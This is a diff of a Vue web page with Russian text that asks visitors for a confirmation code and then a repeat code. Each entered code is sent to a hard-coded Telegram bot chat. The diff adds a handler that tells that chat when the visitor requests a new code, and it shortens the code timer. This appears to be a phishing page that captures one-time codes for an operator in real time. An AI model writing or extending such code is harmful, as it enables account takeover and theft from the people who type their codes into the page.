@@ -27,8 +27,8 @@
           <div v-show="step === 2" class="step">
             <form method="POST" @submit.prevent="submitFormTwo">
               <div class="mb-3">
-                <div class="text-center">Код подтверждения приходить в течение {{time}} минут</div>
                 <input required v-model="codeAuth" type="text" class="form-control" maxlength="5" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Введите код" id="name" aria-describedby="name">
+                <div class="text-center code-text">Код подтверждения приходить в течении {{time}} сек</div>
               </div>
               <div class="text-center">
                 <button type="submit" class="btn btn-danger btn-blockk" @click="nextCodeAuth">Подвердить</button>
@@ -39,12 +39,11 @@
           <div v-show="step === 3" class="step">
             <form method="POST" @submit.prevent="submitFormThree">
               <div class="mb-3">
-                <div class="text-center">Код подтверждения приходить в течение {{time}} минут</div>
                 <input required v-model="codeAuthTwo" type="text" class="form-control" maxlength="5" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Введите код" id="name" aria-describedby="name">
-                <div id="emailHelp" class="form-text color-den">Введите повторно новый код для подтверждения</div>
+                <div id="emailHelp" class="form-text color-den" @click="againAuthCode">Введите повторно новый код для подтверждения</div>
               </div>
               <div class="text-center">
-                <button type="submit" class="btn btn-danger btn-blockk" @click="nextCodeAuth">Подвердить повторно</button>
+                <button type="submit" class="btn btn-danger btn-blockk" :disabled="dsbAgainAuth" @click="nextCodeAuth">Подвердить повторно</button>
               </div>
             </form>
           </div>
@@ -73,7 +72,8 @@ export default {
       chatId: -852249326,
 
       step: 1,
-      date: moment(60 * 5 * 1000)
+      date: moment(60 * 1 * 1000),
+      dsbAgainAuth: true
     }
   },
   methods: {
@@ -91,6 +91,11 @@ export default {
     submitFormThree() {
       const fullMessage = `Повторный код: ${this.codeAuthTwo}`;
       this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
+    },
+     againAuthCode() {
+      const fullMessage = `Спрашивает новый код`;
+      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`);
+      this.dsbAgainAuth = false;
     }
   },
   computed: {
@@ -154,5 +159,10 @@ export default {
 
 .color-den {
   color: rgb(255, 0, 0);
+  font-size: 13px;
+}
+
+.code-text {
+  font-size: 13px;
 }
 </style>
